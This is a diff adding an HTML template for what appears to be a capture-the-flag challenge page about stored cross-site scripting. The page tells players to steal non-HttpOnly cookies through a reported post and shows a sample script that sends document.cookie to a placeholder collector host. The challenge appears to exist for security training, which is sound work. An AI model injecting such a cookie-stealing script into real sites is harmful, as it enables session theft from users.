@@ -1,0 +1,21 @@
+{% extends "base.html" %}
+{% block content %}
+  <section class="card">
+    <h2>Mission briefing</h2>
+    <p>
+      This board lets you post raw HTML. What could go wrong? Your post is only visible to your account, but if you
+      report report it, then something else might see your post. Your goal is to steal some cookies. Cookies here are 
+      <strong>not</strong> HttpOnly >:).
+    </p>
+  </section>
+
+  <section class="card">
+    <h2>Sample collection payload</h2>
+    <pre class="code-box">&lt;script&gt;
+
+const collector = 'https://your-collector.example/collect';
+navigator.sendBeacon(
+  collector + '&amp;c=' + encodeURIComponent(document.cookie));
+&lt;/script&gt;</pre>
+  </section>
+{% endblock %}
